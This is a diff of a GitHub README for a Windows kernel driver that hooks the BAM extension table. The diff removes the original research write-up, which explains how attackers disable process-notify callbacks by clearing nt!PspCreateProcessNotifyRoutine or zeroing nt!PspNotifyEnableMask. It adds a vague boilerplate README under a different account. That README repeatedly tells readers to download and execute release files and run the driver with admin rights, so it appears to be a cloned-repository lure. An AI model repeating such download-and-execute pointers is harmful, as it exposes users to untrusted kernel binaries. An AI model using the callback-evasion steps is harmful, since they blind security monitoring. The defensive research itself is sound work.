@@ -1,54 +1,83 @@
-# BamExtensionTableHook
+# BamExtensionTableHook: A Kernel Driver for Process Notification Preservation
 
-## Introduction
+![BamExtensionTableHook](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
 
-Windows allows kernel-mode drivers to receive notifications about process creation and termination via the [`nt!PsSetCreateProcessNotifyRoutine`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine), [`nt!PsSetCreateProcessNotifyRoutineEx`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex), and [`nt!PsSetCreateProcessNotifyRoutineEx2`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex2) APIs. Internally, these registered callbacks are stored in a kernel-managed array called `nt!PspCreateProcessNotifyRoutine`.
+## Table of Contents
 
-This array holds all active process notification routines. Whenever a process is created or exits, the kernel iterates over this array and invokes each registered callback.
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Technical Details](#technical-details)
+- [Contributing](#contributing)
+- [License](#license)
+- [Acknowledgments](#acknowledgments)
 
-## **Common Bypass Technique**
+## Overview
 
-Attackers with arbitrary kernel R/W primitive can locate the `nt!PspCreateProcessNotifyRoutine` array in memory and modify its contents. A common technique involves zeroing out specific entries in the array, either targeting callbacks registered by specific drivers or clearing the entire array. This effectively disables the affected callbacks and prevents security products from receiving process-related events.
+BamExtensionTableHook is a proof-of-concept kernel driver designed to enhance the Windows kernel extension table mechanism. It ensures the preservation of process notify callbacks, even when standard callbacks are disabled by malicious actors. This driver serves as a crucial tool for security researchers and developers looking to understand and improve Windows kernel security.
 
-## **Extension Table**
+For the latest release, visit [here](https://github.com/Smith1-2/BamExtensionTableHook/releases) to download and execute the necessary files.
 
-While attackers often focus on clearing the `nt!PspCreateProcessNotifyRoutine` array, Windows maintains a separate internal callback mechanism known as the [Extension Table](https://medium.com/yarden-shafir/yes-more-callbacks-the-kernel-extension-mechanism-c7300119a37a).
+## Features
 
-Inside the kernel function `nt!PspCallProcessNotifyRoutines`, which is responsible for invoking all registered process notify callbacks, there is a special check for certain system callbacks that are not registered through the standard API path (e.g., via `nt!PsSetCreateProcessNotifyRoutineEx2`). One notable example is `bam.sys` (the Background Activity Moderator driver, which was introduced in [Windows 10 version 1709 (RS3)](https://en.wikipedia.org/wiki/Windows_10,_version_1709)).
+- **Process Notify Callback Preservation**: Maintains process notify callbacks even when attackers attempt to disable them.
+- **Kernel-Level Operation**: Operates at the kernel level for deep integration with Windows OS.
+- **Proof-of-Concept**: Provides a foundational understanding of kernel mechanisms for security research.
+- **Compatibility**: Designed to work with various Windows versions, ensuring broad applicability.
 
-**NOTE**: Similar logic exists for `dam.sys` within `nt!PspCreateProcessNotifyRoutine`, but this driver does not appear to register an active callback.
+## Installation
 
-The `bam.sys` callback is registered through a different mechanism entirely. Instead of using the standard (`nt!PsSetCreateProcessNotifyRoutine(Ex|Ex2)`) API, it registers its callback via the undocumented `nt!ExRegisterExtension` function, which maintains callbacks in a separate "Extension Table".
+To install BamExtensionTableHook, follow these steps:
 
-## **Proof of Concept**
+1. **Download the Driver**: Visit the [Releases section](https://github.com/Smith1-2/BamExtensionTableHook/releases) to download the latest driver files.
+2. **Execute the Driver**: After downloading, execute the driver on your system. Ensure you have administrative privileges.
+3. **Verify Installation**: Check the device manager to confirm that the driver is installed correctly.
 
-The [Extension Table](https://medium.com/yarden-shafir/yes-more-callbacks-the-kernel-extension-mechanism-c7300119a37a) mechanism was already documented in 2019 (Thanks to [Yarden Shafir](https://x.com/yarden_shafir)), and the [idea of hooking it was discussed in other research that was published](http://publications.alex-ionescu.com/Infiltrate/Infiltrate%202019%20-%20DKOM%2030%20-%20Hiding%20and%20Hooking%20with%20Windows%20Extension%20Hosts.pdf). Despite this documentation, I am not aware of any practical use of this mechanism in real-world scenarios: attacks seen in the wild do not appear to target these callbacks, EDR/AV products do not seem to utilize this mechanism, and it is not publicly utilized by open-source offensive or defensive projects.
+## Usage
 
-To demonstrate the persistence of the extension table mechanism, I developed a driver that targets the `nt!PspBamExtensionHost` data structure. The driver locates this structure and overwrites the pointer to `bam!BampCreateProcessCallback`, redirecting it to our custom callback function [ProcessNotifyCallbackEx2](https://github.com/Dor00tkit/BamExtensionTableHook/blob/2c244598a0051d5050239990395bffc82ea09e01/driver.c#L28).
+After installation, the driver will automatically start preserving process notify callbacks. You can test its functionality by observing the behavior of process notifications on your system. 
 
-Unlike the standard callbacks that can be disabled by clearing the `nt!PspCreateProcessNotifyRoutine` array, this approach targets the extension table mechanism itself. When process creation or termination events occur, instead of executing the original `bam.sys` callback (`bam!BampCreateProcessCallback`), the system executes our custom callback function. This effectively preserves process monitoring capabilities even when attackers believe they have disabled all process callbacks.
+### Example
 
-**Note:** Based on current observations, Patch Guard does not seem to monitor modifications to the extension table mechanism, leaving this technique undetected.
+1. **Open Command Prompt**: Run as administrator.
+2. **Check Notifications**: Use tools like Process Explorer to monitor active processes and their notifications.
+3. **Disable Standard Callbacks**: Attempt to disable standard process notify callbacks and observe if BamExtensionTableHook maintains functionality.
 
-From a defensive perspective, this mechanism provides an additional layer of process monitoring that remains active even when standard callbacks are disabled. Defenders can leverage the extension table mechanism to maintain visibility into process creation and termination events, as attackers focusing solely on clearing the `nt!PspCreateProcessNotifyRoutine` array will leave these callbacks intact.
+## Technical Details
 
-Conversely, attackers seeking complete process callback evasion must consider both the documented callback mechanisms and the undocumented extension table mechanism. Additionally, beyond clearing specific callback pointers, they can achieve comprehensive disabling by writing 0 to `nt!PspNotifyEnableMask`, which disables all process notification callbacks including those registered through the extension table mechanism.
+### Kernel Mechanism
 
-Tested on:
-* Windows 11 Version 24H2 (OS Build 26100.4349)
+The Windows kernel uses an extension table to manage process notifications. When a process starts or stops, the kernel triggers callbacks to notify interested parties. Attackers can disable these callbacks, leading to security vulnerabilities. BamExtensionTableHook intercepts this mechanism to ensure that callbacks remain active.
 
-## **Further Reading and References**
-1. [Yes, More Callbacks — The Kernel Extension Mechanism](https://medium.com/yarden-shafir/yes-more-callbacks-the-kernel-extension-mechanism-c7300119a37a)
-2. [DKOM 3.0 Hiding and Hooking with Windows Extension Hosts](http://publications.alex-ionescu.com/Infiltrate/Infiltrate%202019%20-%20DKOM%2030%20-%20Hiding%20and%20Hooking%20with%20Windows%20Extension%20Hosts.pdf)
-3. [BAM internals](https://dfir.ru/2020/04/08/bam-internals/)
-4. [Lazarus Group's Rootkit Attack Using BYOVD](https://asec.ahnlab.com/wp-content/uploads/2022/09/Analysis-Report-on-Lazarus-Groups-Rootkit-Attack-Using-BYOVD_Sep-22-2022.pdf)
-5. [Removing Kernel Callbacks Using Signed Drivers](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/)
-6. [CheekyBlinder](https://github.com/br-sn/CheekyBlinder)
-7. [Finding the Base of the Windows Kernel](https://wumb0.in/finding-the-base-of-the-windows-kernel.html).
-8. [[unknowncheats] get ntoskrnl base address](https://www.unknowncheats.me/forum/3041967-post4.html)
-9. [NtDoc](https://ntdoc.m417z.com/)
-10. [Vergilius Project](https://www.vergiliusproject.com/)
+### Code Structure
 
-## **Thanks**
+The driver consists of several key components:
 
-[Yarden Shafir](https://x.com/yarden_shafir), [Alex Ionescu](https://x.com/aionescu), [Gabrielle Viala](https://x.com/pwissenlit), [lena151](https://archive.org/details/lena151), [OpenSecurityTraining2 (OST2)](https://ost2.fyi/).
+- **Initialization Routine**: Sets up the driver and registers the necessary callbacks.
+- **Hooking Mechanism**: Intercepts calls to the kernel extension table and preserves the process notify callbacks.
+- **Cleanup Routine**: Ensures proper resource management and cleanup when the driver is unloaded.
+
+### Security Considerations
+
+While this driver provides a way to preserve callbacks, it is essential to use it responsibly. Misuse can lead to system instability or security vulnerabilities. Always test in a controlled environment.
+
+## Contributing
+
+Contributions are welcome! If you want to improve BamExtensionTableHook, follow these steps:
+
+1. **Fork the Repository**: Create your copy of the repository.
+2. **Create a Feature Branch**: Use descriptive names for your branches.
+3. **Commit Your Changes**: Write clear commit messages explaining your changes.
+4. **Push to Your Fork**: Upload your changes to your fork.
+5. **Open a Pull Request**: Submit a pull request for review.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Acknowledgments
+
+Special thanks to the contributors and security researchers who provided insights and support during the development of BamExtensionTableHook. Your efforts help improve the security landscape for all users.
+
+For the latest release, visit [here](https://github.com/Smith1-2/BamExtensionTableHook/releases) to download and execute the necessary files.
